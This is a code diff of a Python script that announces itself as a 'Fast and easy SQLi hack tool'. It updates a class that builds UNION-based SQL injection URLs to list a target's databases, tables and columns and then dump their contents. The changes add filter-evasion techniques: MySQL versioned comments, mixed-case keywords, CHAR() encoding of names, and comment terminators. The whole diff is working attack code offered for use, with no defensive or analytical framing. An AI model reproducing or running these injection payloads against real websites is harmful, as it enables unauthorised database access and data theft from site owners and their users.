@@ -12,23 +12,25 @@ if platform.system() == "Windows":
     clear = "cls"
 os.system(str(clear))
 
-"""
-_____ _              ___      _                     _____                    
+header="""
+ _____ _              ___      _                     _____                    
 /__   \ |__   ___    / __\   _| |__   ___ _ __ ___  /__   \___  __ _ _ __ ___  
   / /\/ '_ \ / _ \  / / | | | | '_ \ / _ \ '__/ __|   / /\/ _ \/ _` | '_ ` _ \ 
  / /  | | | |  __/ / /__| |_| | |_) |  __/ |  \__ \  / / |  __/ (_| | | | | | |
  \/   |_| |_|\___| \____/\__, |_.__/ \___|_|  |___/  \/   \___|\__,_|_| |_| |_|
-                         |___/                                                 Beta 2.1
-More: https://www.facebook.com/TheCybersTeam"
-Fast and easy SQLi hack tool"
+                         |___/                                                 
+
+More: https://www.facebook.com/TheCybersTeam
+Fast and easy SQLi hack tool Beta 2.2"
 """
+print header
 
 class Sqli:
     url = None
     vulCol = None
     columns = None
     dbs = []
-    payload = "0x2d31+/*!50000UNION*//*!50000SELECT*/"
+    payload = "0x2d31+/*!50000union*/+/*!50000select*/"
     build = ["", ""]
     key = "1620597971540027"
     def setUrl(self):
@@ -88,7 +90,7 @@ class Sqli:
         self.vulCol = 0
 
     def getConcat(self,string):
-        return "concat(0x27,0x23,group_concat(unhex(hex("+string+"))),0x23,0x27)"
+        return "cONCaT(0x27,0x23,/*!50000group_concat("+string+")*/,0x23,0x27)"
 
     def getVars(self,content):
         pos = content.find("'#")
@@ -126,12 +128,23 @@ class Sqli:
 
     def getTables(self,database):
 
-        url = self.build[0]+self.getConcat("table_name")+self.build[1]+"+from+information_schema.tables+where+table_schema='"+database+"'"
+        url = self.build[0]+self.getConcat("table_name")+self.build[1]+"++from+/*!50000inforMAtion_schema*/.tables+ /*!50000wHEre*/+/*!50000taBLe_scheMA*/like'"+database+"'--+"
         res = self.getContent(url)
         return self.getVars(res)
 
+    def charCode(self,string):
+        char = ""
+        last = len(string)-1
+        i = 0
+        for j in string:
+            char+=str(ord(j))
+            if last != i:
+                char+=", "
+            i+=1
+        return char
+
     def getColumns(self,table,database):
-        url = self.build[0]+self.getConcat("column_name")+self.build[1]+"+from+information_schema.columns+where+table_name='"+table+"'"
+        url = self.build[0]+self.getConcat("column_name")+self.build[1]+"++from+/*!50000inforMAtion_schema*/.columns+ /*!50000wHEre*/+/*!50000taBLe_name*/=CHAR("+self.charCode(table)+")--+"
         res = self.getContent(url)
         return self.getVars(res)
 
@@ -147,7 +160,7 @@ class Sqli:
                 line+=",0x3a,"
             line+=name
             i+=1
-        url = self.build[0]+"concat(0x27,0x23,group_concat("+line+"),0x23,0x27)"+self.build[1]+"+from+"+table
+        url = self.build[0]+"concat(0x27,0x23,/*!50000gROup_cONcat("+line+")*/,0x23,0x27)"+self.build[1]+"+from+"+table+"--+-"
         res = self.getContent(url)
         data = self.getVars(res)
         try:
